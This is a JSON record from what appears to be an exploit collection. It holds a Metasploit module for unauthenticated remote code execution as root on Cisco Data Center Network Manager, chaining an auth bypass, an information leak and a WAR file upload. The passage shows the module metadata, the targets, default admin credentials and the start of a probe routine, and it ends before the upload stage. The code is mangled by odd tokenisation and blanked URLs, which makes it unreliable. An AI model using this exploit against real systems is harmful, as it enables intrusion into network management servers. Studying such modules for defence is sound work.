{
    "text": "vul_name : Cisco Data Center Network Manager Unauthenticated Remote Code Execution ( Metasploit )  ， vul_cve : CVE-2019-1619 , CVE-2019-1622 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => 'Cisco Data Center Network Manager Unauthenticated Remote Code Execution' ,  ， 'Description' => %q{ ， DCNM exposes a file upload servlet ( FileUploadServlet ) at /fm/fileUpload. ， An authenticated user can abuse this servlet to upload a WAR to the Apache Tomcat webapps ， directory and achieve remote code execution as root. ， This module exploits two other vulnerabilities , CVE-2019-1619 for authentication bypass on ， versions 10.4 ( 2 ) and below , and CVE-2019-1622 ( information disclosure ) to obtain the correct ， directory for the WAR file upload. ， This module was tested on the DCNM Linux virtual appliance 10.4 ( 2 )  , 11.0 ( 1 ) and 11.1 ( 1 )  , and should ， work on a few versions below 10.4 ( 2 ) . Only version 11.0 ( 1 ) requires authentication to exploit ，  ( see ， } ,  ， 'Author' => ，  [  ， 'Pedro Ribeiro <pedrib [ at ] gmail.com>' # Vulneerability discovery and Metasploit module ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， ' ，  [  ，  [ 'CVE' , '2019-1619' ]  ,  # auth bypass ，  [ 'CVE' , '2019-1620' ]  ,  # file upload ，  [ 'CVE' , '2019-1622' ]  ,  # log download ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Platform' => 'java' ,  ， 'Arch' => ARCH_JAVA ,  ， 'Targets' => ，  [  ，  [ 'Automatic' , {} ]  ,  ，  [  ， 'Cisco DCNM 11.1 ( 1 ) ' , {} ，  ]  ,  ，  [  ， 'Cisco DCNM 11.0 ( 1 ) ' , {} ，  ]  ,  ，  [  ， 'Cisco DCNM 10.4 ( 2 ) ' , {} ，  ]  ，  ]  ,  ， 'Privileged' => true ,  ， 'DefaultOptions' => { 'WfsDelay' => 10 } ,  ， 'DefaultTarget' => 0 ,  ， 'DisclosureDate' => 'Jun 26 2019' ， register_options (  ，  [  ， Opt : RPORT ( 443 )  ,  ， OptBool.new ( 'SSL' ,  [ true , 'Connect with TLS' , true ]  )  ,  ， OptString.new ( 'TARGETURI' ,  [ true , \"Default server path\" , '/' ]  )  ,  ， OptString.new ( 'USERNAME' ,  [ true , \"Username for auth ( required only for 11.0 ( 1 ) and above\" , 'admin' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ true , \"Password for auth ( required only for 11.0 ( 1 ) and above\" , 'admin' ]  )  ,  ，  ]  )  ， end ， def check ，  # at the moment this is the best way to detect ，  # check if pmreport and fileUpload servlets return a 500 error with no params ， res = send_request_cgi (  ， 'uri' => normalize_uri ( target_uri.path , 'fm' , 'pmreport' )  ,  ， 'vars_get' => ， { ， 'token' => rand_text_alpha ( 5.20 )  ， } ,  ， 'method' => 'GET' ， res = send_request_cgi (  ， 'uri' => normalize_uri ( target_uri.path , 'fm' , 'fileUpload' )  ,  ， 'method' => 'GET' , ",
    "time": "2019.09.20"
}